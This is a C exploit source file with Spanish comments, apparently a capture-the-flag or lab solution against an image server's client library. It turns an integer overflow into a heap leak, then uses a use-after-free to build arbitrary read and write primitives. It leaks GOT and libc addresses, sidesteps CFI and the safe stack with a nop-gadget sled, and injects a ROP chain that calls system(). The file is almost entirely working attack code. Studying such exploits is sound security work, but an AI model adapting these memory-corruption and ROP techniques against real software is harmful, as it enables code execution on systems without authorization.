// xploit.c

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <strings.h>
#include <string.h>

#include "libimg.h"


#define RESPONSE_BUFFER_LENGTH 65535

uint8_t response_buffer[RESPONSE_BUFFER_LENGTH];

//==============================================================================
// perform_initial_leak
//------------------------------------------------------------------------------

int perform_initial_leak() {
  uint8_t data[16];
  bzero((void*)&data, sizeof(data));

  /* Explotamos el integer overflow para filtrar el heap del objetivo.
   * 
   * El total es w*h = 65552. Este valor entra en un unsigned int,
   * pero no en un unsigned short, el cuál termina con valor 8.
   *
   * El resultado neto es un overread del lado del servidor;
   * los datos sobreleídos pueden ser luego recuperados con
   * get_grayscale_image_bytes.
   *
   */
  uint16_t w = 32776;
  uint16_t h = 2;
  uint32_t t = w*h;

  int handle = make_grayscale_image(h, w, (unsigned char*)&data);

  uint8_t *out_buffer;
  get_grayscale_image_bytes(handle, &out_buffer, &w, &h);

  memcpy(response_buffer, out_buffer, t);

  free(out_buffer);
  return handle;
}

//==============================================================================
// read_from
//------------------------------------------------------------------------------

void read_from(
    uint64_t target_address,
    uint16_t count,
    uint64_t vptr_GrayscaleImage,
    int uaf_handle) {

  /* Liberamos el handle. Debe ser tal que la próxima reserva por un bloque
   * de 0x18 bytes sea efectivamente designada a la dirección del objeto
   * que estamos liberando. Es por esto que el exploit asume un servidor en 
   * estado inicial; para hacer al exploit funcionar en el caso general, 
   * sería necesario asegurarse de que la próxima solicitud por un bloque
   * de 0x18 bytes devuelva efectivamente aquel perteneciente al objeto
   * identificado por uaf_handle.
   *
   */
  free_grayscale_image(uaf_handle);
    
  /* Del lado del servidor, width y height se almacenan contiguos
   * como enteros de 2 bytes. En la línea de 8 bytes, los 4 más bajos
   * son nulos. La siguiente operación construye una secuencia de 8
   * bytes tal que, al reemplazar los datos del objeto GrayscaleImage,
   * width sea igual a count y height sea igual a 1, con lo cuál el
   * producto será igual a count, permitiéndonos leer count bytes.
   *
   */
  uint64_t c = (((uint64_t)count) << 16) + 1;

  /* La siguiente secuencia de 18 bytes sobrescribirá los datos del
   * objeto GrayscaleImage que hemos liberado. En otro caso, controlar 
   * el vptr nos daría probablemente mucha flexibilidad. Debido a CFI, 
   * sin embargo, para este exploit nos debemos limitar a trabajar solo
   * con operaciones legales sobre el objeto, si bien podemos modificar
   * sus atributos para controlar esas operaciones como nos resulte
   * conveniente.
   *
   */
  uint64_t input[] = {
    vptr_GrayscaleImage, // vptr
    c,                   // 0x00000000 | width (2 bytes) | height (2 bytes)
    target_address
  };

  /* Creamos una nueva imagen del lado del servidor. La cantidad de bytes
   * es para que la escritura del primer buffer se de precisamente a partir
   * de lo que antes era el objeto GrayscaleImage en sí.
   *
   */
  make_grayscale_image(sizeof(input), 1, (uint8_t *)&input);

  /* Procedemos leyendo el buffer de datos del objeto.
   *
   */
  uint16_t w;
  uint16_t h;

  uint8_t *out_buffer;
  get_grayscale_image_bytes(uaf_handle, &out_buffer, &w, &h);
  memcpy(response_buffer, out_buffer, count);
  free(out_buffer);
}

//==============================================================================
// write_what_where
//------------------------------------------------------------------------------

void write_what_where(
    uint64_t target_address,
    uint8_t *data,
    uint16_t data_length,
    uint64_t vptr_GrayscaleImage,
    int uaf_handle) {

  /* Comenzamos esencialmente igual que en la lectura arbitraria,
   * liberando la imagen identificada por uaf_handle para sobrescribir
   * sus datos.
   *
   */
  free_grayscale_image(uaf_handle);
    
  /* Nuevamente, procederemos a sobrescribir los datos de un objeto
   * GrayscaleImage mediante la reserva de un bloque de 0x18 bytes.
   *
   */
  uint64_t c = (((uint64_t)data_length) << 16) + 1;

  uint64_t input[] = {
    vptr_GrayscaleImage, // vptr
    c,                   // 0x00000000 | width (2 bytes) | height (2 bytes)
    target_address
  };

  /* Modificamos los datos del viejo objeto GrayscaleImage identificado
   * por el handle uaf_handle.
   *
   */
  make_grayscale_image(sizeof(input), 1, (uint8_t *)&input);

  /* Ejecutamos la escritura.
   *
   */
  set_grayscale_image_bytes(uaf_handle, data, data_length);
}

//==============================================================================
// main
//------------------------------------------------------------------------------

int main(int argc, char **argv) {
  img_init();

  printf("[*] Ejecutando leak inicial...\n");

  int uaf_handle = perform_initial_leak();

  /* Obtenemos la dirección de la vtable real de GrayscaleImage.
   *
   */
  uint64_t vptr_GrayscaleImage = ((uint64_t*)response_buffer)[4];

  /* Obtenemos la dirección base de la GOT. Con gdb determinamos que
   * se encuentra 0x2b0 bytes por encima de la vtable.
   *
   */
  uint64_t got_base = vptr_GrayscaleImage + 0x2b0;

  printf("[*] ... vptr_GrayscaleImage:\n");
  printf("[-] ... 0x%lx\n", vptr_GrayscaleImage);
  printf("[-] \n");

  printf("[*] ... got_base:\n");
  printf("[-] ... 0x%lx\n", got_base);
  printf("[-] \n");

  /* Leemos las direcciones de __libc_start_main y de __libc_stack_end,
   * la primera en libc.so.6, la segunda en ld-linux-x86-64.so.2,
   * ambas oportunamente contiguas en la GOT.
   *
   */
  printf("[*] Leyendo GOT...\n");

  read_from(got_base + 0x188, 16, vptr_GrayscaleImage, uaf_handle);
    
  /* Extraemos las direcciones relevantes del dump y calculamos
   * la dirección de system, la cuál estaremos usando luego.
   *
   */
  uint64_t addr_libc_start_main = ((uint64_t*)response_buffer)[0];
  uint64_t addr_libc_stack_end = ((uint64_t*)response_buffer)[1];

  uint64_t addr_system = addr_libc_start_main + 0x2d990;

  printf("[*] ... addr_libc_start_main:\n");
  printf("[-] ... 0x%lx\n", addr_libc_start_main);
  printf("[-] \n");

  printf("[*] ... addr_system:\n");
  printf("[-] ... 0x%lx\n", addr_system);
  printf("[-] \n");

  printf("[*] ... addr_libc_stack_end:\n");
  printf("[-] ... 0x%lx\n", addr_libc_stack_end);
  printf("[-] \n");
  
  /* Ejecutamos algunas lecturas adicionales para obtener las direcciones
   * de __environ y eventualmente la del inicio de las variables de entorno
   * en el safe stack.
   *
   */
  printf("[*] Leyendo *addr_libc_stack_end...\n");

  read_from(addr_libc_stack_end, 8, vptr_GrayscaleImage, uaf_handle);
    
  addr_libc_stack_end = ((uint64_t*)response_buffer)[0];
  uint64_t addr_environ = addr_libc_stack_end + 0x18;

  printf("[*] ... addr_environ:\n");
  printf("[-] ... 0x%lx\n", addr_environ);
  printf("[-] \n");

  printf("[*] Leyendo __environ...\n");

  read_from(addr_environ, 8, vptr_GrayscaleImage, uaf_handle);
  uint64_t addr_ss_env = ((uint64_t*)response_buffer)[0];

  printf("[*] ... addr_ss_env:\n");
  printf("[-] ... 0x%lx\n", addr_ss_env);
  printf("[-] \n");


  /* El safe stack tiene algo de entropía interna, aunque no es suficiente
   * para prevenir un ataque exitoso. En vez de escribir a partir de una
   * dirección de retorno particular, lo que haremos es llenar el safe
   * stack de direcciones de gadgets nop hasta el inicio de las variables
   * de entorno. Por mera inspección en gdb, notamos que la distancia desde 
   * la dirección de retorno de handle_request hasta addr_ss_env es 
   * inferior a 0x2000, al menos usualmente, con lo cuál un nopsled de 
   * 0xff00 bytes debería ser más que suficiente para hacer al exploit 
   * confiable. El tamaño del safe stack es mucho mayor a 0xff00 bytes, 
   * con lo cuál la escritura a partir de addr_ss_env - sizeof_nopsled 
   * debería ser segura.
   *
   * Nótese que nuestra primitiva de escritura está limitada a 0xffff
   * bytes, con lo cuál debemos dejar algo de espacio adicional para
   * la cadena de ROP, la cuál ocupará unos 0x40 bytes. Alternativamente,
   * deberíamos ejecutar la primitiva de escritura varias veces
   * para lograr copiar la totalidad de los datos.
   *
   */
  uint64_t sizeof_nopsled = 0xff00;
  uint64_t addr_chain = addr_ss_env - sizeof_nopsled;

  /* Resulta que memcpy usa instrucciones xmm que fallan si la dirección de
   * destino no está alineada a 16 bytes. Para resolver el problema, alineamos
   * la dirección a partir de la cuál escribir a 16. Ya que estaremos usando
   * un nopsled, la precisión no es demasiado importante.
   *
   */
  addr_chain >>= 8; // Limpiamos los 8 bits menos significativos.
  addr_chain <<= 8;

  /* Preparamos el payload de la cadena de ROP. Se trata de una llamada
   * a system que creará un archivo vacío llamado you-win.txt en /tmp, y 
   * luego finalizará la ejecución llamando a exit.
   *
   */
  uint64_t payload[] = {
    addr_system - 0x2dee1,                // pop rdi; ret
    addr_chain + sizeof_nopsled + 0x20,   // &"touch /tmp/you-win.txt"
    addr_system,
    addr_system - 0xc320,                 // &exit
    0,                                    // "touch /tmp/you-win.txt", ver abajo
    0,
    0,
    0,
  };

  // Copiamos el string del comando a ejecutar al final de la cadena de ROP.
  strcpy((char *)&payload[4], "touch /tmp/you-win.txt");

  // Creamos el nopsled.
  uint64_t I = sizeof_nopsled/8;
  uint64_t chain[I + sizeof(payload)/8];

  for (uint64_t i = 0; i < I; i++) {
    chain[i] = addr_system - 0x22961; // nop; ret
  }

  // Copiamos la cadena al final del nopsled.
  memcpy((void*)&chain[I], (void*)&payload, sizeof(payload));

  printf("[*] Ejecutando escritura arbitraria para inyectar ROP...\n");
  uint8_t *chain_buff = (uint8_t*)&chain;
  write_what_where(addr_chain, chain_buff, sizeof(chain), vptr_GrayscaleImage, uaf_handle);

  printf("[*] Hecho, el payload debería haber sido inyectado, revisar /tmp.\n");
  printf("[-] \n");
    
  return 0;
}
